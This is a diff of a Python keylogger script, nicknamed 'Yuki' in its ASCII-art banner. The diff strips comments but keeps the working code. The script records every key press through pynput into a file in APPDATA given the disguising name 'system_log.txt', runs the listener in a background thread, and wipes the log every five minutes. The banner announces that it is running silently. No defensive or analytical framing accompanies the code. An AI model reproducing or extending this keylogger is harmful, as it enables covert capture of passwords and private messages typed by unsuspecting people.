@@ -4,16 +4,14 @@ from pynput import keyboard
 from pynput.keyboard import Key, Listener
 import threading
 
-# Hide the console window (Windows only)
 import ctypes
 
 # Define the log file path
 log_file = os.environ.get('APPDATA') + '\\system_log.txt'
 
-# ASCII Art UI for "Yuki" in Fraktur font, colored blue
 def print_ui():
     os.system('cls' if os.name == 'nt' else 'clear')
-    print("\033[34m")  # Set text color to blue
+    print("\033[34m") 
     print(r"""
                                     ..         .    
   ..                        < .z@8"`        @88>  
@@ -31,11 +29,10 @@ def print_ui():
      ./"                                          
     ~`                                            
     """)
-    print("\033[0m")  # Reset text color
+    print("\033[0m")  
     print("Keylogger is running silently...")
     print("Press CTRL+C to exit.\n")
 
-# Function to log the keystrokes
 def on_press(key):
     try:
         with open(log_file, 'a') as f:
@@ -55,28 +52,23 @@ def on_press(key):
         with open(log_file, 'a') as f:
             f.write(special_keys.get(key, f'[{key}]'))
 
-# Function to start the keylogger
 def start_keylogger():
     with Listener(on_press=on_press) as listener:
         listener.join()
 
-# Function to periodically clear the log file (optional)
 def clear_log():
     while True:
         time.sleep(300)  # Clear every 5 minutes
         with open(log_file, 'w') as f:
             f.write('')
 
-# Main function
 if __name__ == '__main__':
     print_ui()
 
-    # Start the keylogger in a separate thread
     keylogger_thread = threading.Thread(target=start_keylogger)
     keylogger_thread.daemon = True
     keylogger_thread.start()
 
-    # Start the periodic log clearing in a separate thread (optional)
     clear_thread = threading.Thread(target=clear_log)
     clear_thread.daemon = True
     clear_thread.start()
